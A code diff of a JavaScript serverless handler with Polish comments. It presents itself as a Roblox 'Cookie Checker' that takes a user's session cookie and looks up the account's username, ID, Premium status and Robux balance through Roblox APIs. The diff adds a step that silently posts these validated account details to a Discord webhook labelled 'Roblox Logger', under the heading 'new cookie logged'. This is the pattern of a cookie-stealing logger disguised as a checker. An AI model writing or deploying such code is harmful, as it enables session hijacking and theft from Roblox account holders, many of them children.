@@ -3,21 +3,17 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Tylko POST dozwolone' });
-  }
+  if (req.method === 'OPTIONS') return res.status(200).end();
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Tylko POST dozwolone' });
 
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
-    return res.status(400).json({ error: 'Brak poprawnego cookie (zbyt krótkie lub brak)' });
+    return res.status(400).json({ error: 'Brak poprawnego cookie' });
   }
 
   try {
-    // Krok 1 – pobierz X-CSRF-Token (fake logout)
+    // ────────────────────────────────────────────────
+    // 1. CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -28,10 +24,11 @@ export default async function handler(req, res) {
 
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) {
-      throw new Error('Nie udało się pobrać X-CSRF-Token – cookie prawdopodobnie nieważne lub wygasłe');
+      throw new Error('Nie udało się pobrać X-CSRF-Token – cookie prawdopodobnie nieważne');
     }
 
-    // Krok 2 – pobierz dane użytkownika (username, id, etc.)
+    // ────────────────────────────────────────────────
+    // 2. Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       method: 'GET',
       headers: {
@@ -42,16 +39,15 @@ export default async function handler(req, res) {
     });
 
     if (!userRes.ok) {
-      if (userRes.status === 401) {
-        throw new Error('Cookie nieważne lub wygasłe (401 Unauthorized)');
-      }
-      throw new Error(`Błąd Roblox API (użytkownik): ${userRes.status} – ${await userRes.text()}`);
+      if (userRes.status === 401) throw new Error('Cookie nieważne lub wygasłe (401)');
+      throw new Error(`Błąd Roblox: ${userRes.status}`);
     }
 
     const userData = await userRes.json();
     const userId = userData.id;
 
-    // Krok 3 – sprawdź Premium
+    // ────────────────────────────────────────────────
+    // 3. Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
@@ -62,16 +58,11 @@ export default async function handler(req, res) {
           'Accept': 'application/json',
         },
       });
+      if (premiumRes.ok) hasPremium = !!(await premiumRes.json());
+    } catch {}
 
-      if (premiumRes.ok) {
-        const premiumData = await premiumRes.json();
-        hasPremium = !!premiumData; // true/false
-      }
-    } catch (premiumErr) {
-      // cichy fail – premium nie jest krytyczne
-    }
-
-    // Krok 4 – pobierz Robux (saldo)
+    // ────────────────────────────────────────────────
+    // 4. Robux (aktualny endpoint w 2026 nadal działa)
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
@@ -82,26 +73,53 @@ export default async function handler(req, res) {
           'Accept': 'application/json',
         },
       });
-
       if (currencyRes.ok) {
-        const currencyData = await currencyRes.json();
-        robux = currencyData.robux || 0;
+        const data = await currencyRes.json();
+        robux = data.robux || 0;
       }
-      // Jeśli 403/401 → csrf stary lub cookie złe → robux zostaje 0
-    } catch (currencyErr) {
-      // cichy fail
+    } catch {}
+
+    // ────────────────────────────────────────────────
+    // 5. Wysyłka do Discord Webhook (jeśli zmienna istnieje)
+    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+    if (webhookUrl) {
+      const embed = {
+        title: "🔓 Nowe cookie zalogowane!",
+        color: hasPremium ? 0x00ff9d : 0x1e90ff,
+        fields: [
+          { name: "Username", value: userData.name, inline: true },
+          { name: "Display Name", value: userData.displayName || userData.name, inline: true },
+          { name: "User ID", value: userId.toString(), inline: true },
+          { name: "Premium", value: hasPremium ? "✅ TAK" : "❌ NIE", inline: true },
+          { name: "Robux", value: robux.toLocaleString() + " ₪", inline: true },
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Cookie Checker • " + new Date().toLocaleString('pl-PL') }
+      };
+
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [embed],
+          username: "Roblox Logger",
+          avatar_url: "https://i.imgur.com/xyz.png" // możesz zmienić na dowolne logo
+        })
+      });
     }
 
+    // ────────────────────────────────────────────────
+    // Odpowiedź dla użytkownika (frontend)
     res.status(200).json({
       success: true,
       username: userData.name,
       displayName: userData.displayName || userData.name,
       userId: userData.id,
-      hasPremium: hasPremium,
-      robux: robux
+      hasPremium,
+      robux
     });
 
   } catch (err) {
-    res.status(500).json({ error: err.message || 'Nieznany błąd serwera' });
+    res.status(500).json({ error: err.message || 'Błąd serwera' });
   }
 }
